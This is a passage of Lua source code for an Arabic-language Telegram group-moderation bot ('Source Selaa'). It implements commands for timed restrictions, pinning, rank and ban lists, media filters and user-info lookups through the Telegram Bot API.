Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع تقيد ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تقيده لمدة ⇇ "..mutept.." س") 
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع تقيد ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تقيده لمدة ⇇ "..mutept.." ي") 
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     Source Selaa     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
Selaa:set('SelaaTEAM:'..Selaa..'id:user'..msg.chat_id_,TXT)  
Selaa:setex('SelaaTEAM:'..Selaa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل عدد الرسائل الان \n↯☆ارسل الغاء لالغاء الامر ", 1, "md")
Selaa(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
Selaa:del(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
Selaa:incrby(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
Selaa:set('SelaaTEAM:'..Selaa..'ids:user'..msg.chat_id_,TXT)  
Selaa:setex('SelaaTEAM:'..Selaa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل عدد النقاط الان \n↯☆ارسل الغاء لالغاء الامر ", 1, "md")
Selaa(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
Selaa:incrby(Selaa..'Selaa:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if Selaa:get(Selaa..'Selaa:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then Selaa:sadd(Selaa.."Selaa:cleaner"..msg.chat_id_, msg.id_) else Selaa:sadd(Selaa.."Selaa:cleaner"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if Selaa:sismember(Selaa.."Selaa:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Selaa(msg.chat_id_,msg.id_, 1, "↯☆التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
Selaa:set(Selaa..'Selaa:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تثبيت الرساله بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source Selaa     --
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:VipMem:'..msg.chat_id_)
text = "↯☆قائمة المميزين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد مميزين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Selaa     --
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local abs =  'Selaa:Admins:'..msg.chat_id_
local list = Selaa:smembers(Selaa..abs)
text = "↯☆قائمة الادمنيه ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "↯☆*لا يوجد ادمنيه*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source Selaa     -- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:Managers:'..msg.chat_id_)
text = "↯☆قائمة المدراء ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد مدراء*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:Cleaner:'..msg.chat_id_)
text = "↯☆قائمة المنظفين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد منظفين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Selaa     --
if BasicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:Constructor:'..msg.chat_id_)
text = "↯☆قائمة المنشئين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد منشئين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Selaa     --
if SelaaConstructor(msg) then
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_)
text = "↯☆قائمة المنشئين الاساسيين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد منشئين اساسيين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "sourcesela")
Selaa(msg.chat_id_, msg.id_, 1, "↯☆منشئ المجموعه ⇇ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source Selaa     --
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:Muted:'..msg.chat_id_)
text = "↯☆قائمة المكتومين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد مكتومين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Selaa     --
if text == "المقيدين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:Tkeed:'..msg.chat_id_)
text = "↯☆قائمة المقيدين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "↯☆*لا يوجد مقيدين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Selaa     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:Ban:'..msg.chat_id_)
text = "↯☆قائمة المحظورين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد محظورين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "قائمه المنع" and ChCheck(msg) then
local list = Selaa:hkeys(Selaa..'Selaa:Filters:'..msg.chat_id_)
text = "↯☆قائمة المنع ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #list == 0 then
text = "↯☆لا توجد كلمات ممنوعه"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     Source Selaa     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local list = Selaa:smembers(Selaa..'User:Donky:'..msg.chat_id_)
text = "↯☆قائمة مطاية المجموعه 😹💔 ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "↯☆*لا يوجد مطايه كلها اوادم* 😹💔"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Selaa     --
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "⇇ قائمه العام ⌁" and ChCheck(msg) then 
local BanAll = Selaa:smembers(Selaa..'Selaa:BanAll:')
local MuteAll = Selaa:smembers(Selaa..'Selaa:MuteAll:')
if #BanAll ~= 0 then 
text = "↯☆قائمة المحظورين عام ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(BanAll) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."↯☆قائمة المكتومين عام ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(MuteAll) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "↯☆*لم يتم حظر او كتم اي عضو*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Selaa     --
if text == "المطورين" and ChCheck(msg) or text == "⇇ المطورين ⌁" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:SudoBot:')
text = "↯☆قائمة المطورين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local sudouser = Selaa:get(Selaa..'Selaa:Sudos'..v) 
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..""..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #list == 0 then
text = "↯☆*عذرا لم يتم رفع اي مطورين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Selaa     --
if text == "المدراء العامين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:ManagerAll:')
text = "↯☆قائمة المدراء العامين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد مدراء عامين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Selaa     --
if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa..'Selaa:VipAll:')
text = "↯☆قائمة المميزين العام ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "↯☆*لا يوجد مميزين عام*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Selaa     -- 
if text == "الادمنيه العامين" and ChCheck(msg) then 
local abs =  'Selaa:AdminAll:'
local list = Selaa:smembers(Selaa..abs)
text = "↯☆قائمة الادمنيه العامين ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local username = Selaa:get(Selaa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "↯☆*لا يوجد ادمنيه عامين*"
end
Selaa(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
--     Source Selaa     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المنشئ") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
Selaa:del(Selaa..'Selaa:SelaaConstructor:'..msg.chat_id_)
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "sourcesela")
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم رفع منشئ المجموعه ⇇ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
Selaa:sadd(Selaa.."Selaa:SelaaConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
end 
--     Source Selaa     --
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
Selaa:sadd(Selaa.."Selaa:FilterSteckr"..msg.chat_id_,idsticker)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
Selaa:sadd(Selaa.."Selaa:FilterPhoto"..msg.chat_id_,photo)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
Selaa:sadd(Selaa.."Selaa:FilterAnimation"..msg.chat_id_,idanimation)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source Selaa     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
Selaa:srem(Selaa.."Selaa:FilterSteckr"..msg.chat_id_,idsticker)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
Selaa:srem(Selaa.."Selaa:FilterPhoto"..msg.chat_id_,photo)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
Selaa:srem(Selaa.."Selaa:FilterAnimation"..msg.chat_id_,idanimation)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source Selaa     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..data.id_) or 0)
if Selaa:sismember(Selaa..'Selaa:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif Selaa:sismember(Selaa..'Selaa:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif Selaa:sismember(Selaa..'Selaa:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif Selaa:sismember(Selaa..'Selaa:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n↯☆القيود ⇇ '..Tkeed
else 
Tked = '' 
end
if Selaa:sismember(Selaa..'Selaa:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n↯☆عدد الجروبات ⇇ '..(Selaa:get(Selaa..'Selaa:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n↯☆لقبه ⇇ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '↯☆اسمه ⇇ ['..CatchName(data.first_name_,20)..'](tg://user?id='..result.sender_user_id_..')\n↯☆ايديه ⇇ ❨ `'..result.sender_user_id_..'` ❩\n↯☆رتبته ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..'\n↯☆رسائله ⇇ ❨ '..user_msgs..' ❩\n↯☆تفاعله ⇇ '..formsgs(user_msgs)..''..CustomTitle..'\n↯☆نقاطه ⇇ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Selaa(msg.chat_id_, msg.id_, 1,'↯☆معرفه ⇇ [@'..data.username_..']\n↯☆ايديه ⇇ ❨ `'..result.sender_user_id_..'` ❩\n↯☆رتبته ⇇ '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..'\n↯☆رسائله ⇇ ❨ '..user_msgs..' ❩\n↯☆تفاعله ⇇ '..formsgs(user_msgs)..''..CustomTitle..'\n↯☆نقاطه ⇇ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '↯☆نوع الحساب ⇇ ❨ '..ch..' ❩\n↯☆الايدي ⇇ ❨ `'..res.id_..'` ❩\n↯☆المعرف ⇇ ❨ [@'..username..'] ❩\n↯☆الاسم ⇇ ❨ ['..res.title_..'] ❩'
Selaa(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '↯☆نوع الحساب ⇇ ❨ '..gr..' ❩\n↯☆الايدي ⇇ ❨ '..res.id_..' ❩\n↯☆المعرف ⇇ ❨ [@'..username..'] ❩\n↯☆الاسم ⇇ ❨ ['..res.title_..'] ❩'
Selaa(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..res.id_) or 0)
if Selaa:sismember(Selaa..'Selaa:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif Selaa:sismember(Selaa..'Selaa:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif Selaa:sismember(Selaa..'Selaa:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif Selaa:sismember(Selaa..'Selaa:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n↯☆القيود ⇇ '..Tkeed
else 
Tked = '' 
end
if Selaa:sismember(Selaa..'Selaa:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n↯☆عدد الجروبات ⇇ '..(Selaa:get(Selaa..'Selaa:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n↯☆لقبه ⇇ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆الحساب محذوف', 1, 'md')
return false  end
Selaa(msg.chat_id_, msg.id_, 1,'↯☆معرفه ⇇ [@'..data.username_..']\n↯☆ايديه ⇇ ❨ `'..res.id_..'` ❩\n↯☆رتبته ⇇ '..IdRank(res.id_, msg.chat_id_)..''..sudobot..'\n↯☆رسائله ⇇ ❨ '..user_msgs..' ❩\n↯☆تفاعله ⇇ '..formsgs(user_msgs)..''..CustomTitle..'\n↯☆نقاطه ⇇ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..iduser) or 0)
if Selaa:sismember(Selaa..'Selaa:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif Selaa:sismember(Selaa..'Selaa:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif Selaa:sismember(Selaa..'Selaa:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif Selaa:sismember(Selaa..'Selaa:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n↯☆القيود ⇇ '..Tkeed
else 
Tked = '' 
end
if Selaa:sismember(Selaa..'Selaa:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n↯☆عدد الجروبات ⇇ '..(Selaa:get(Selaa..'Selaa:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
